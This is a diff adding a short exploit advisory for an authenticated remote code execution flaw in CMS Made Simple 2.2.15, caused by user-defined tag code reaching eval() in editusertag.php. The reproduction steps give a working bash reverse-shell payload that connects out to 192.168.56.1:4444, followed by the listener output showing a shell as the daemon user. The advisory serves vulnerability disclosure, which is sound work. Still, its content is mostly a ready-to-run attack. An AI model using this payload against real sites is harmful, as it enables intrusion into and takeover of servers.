@@ -1,0 +1,30 @@
+# Exploit Title: CMS Made Simple 2.2.15 - RCE (Authenticated)
+# Author: Andrey Stoykov
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads/cmsms
+# Version: 2.2.15
+# Tested on: Debian 10 LAMPP
+# Exploit and Detailed Info: https://infosecresearchlab.blogspot.com/2020/12/cms-made-simple-2215-authenticated-rce.html
+
+Vulnerability is present at "editusertag.php" at line #93 where the user input is in eval() PHP function.
+
+// Vulnerable eval() code
+
+if (eval('function testfunction'.rand().'() {'.$code."\n}") === FALSE) {
+
+Reproduction Steps:
+
+1. Login as administrator user and navigate to Extensions->User Defined Tags
+
+2. Add code with the payload of:
+exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.56.1/4444 0>&1'");
+
+3. Click on the newly created User Defined Tag and use the Run function
+
+RCE will be achieved:
+
+astoykov@Lubuntu:~$ nc -kvlp 4444
+nc: getnameinfo: Temporary failure in name resolution
+Connection received on 192.168.56.132 53690
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
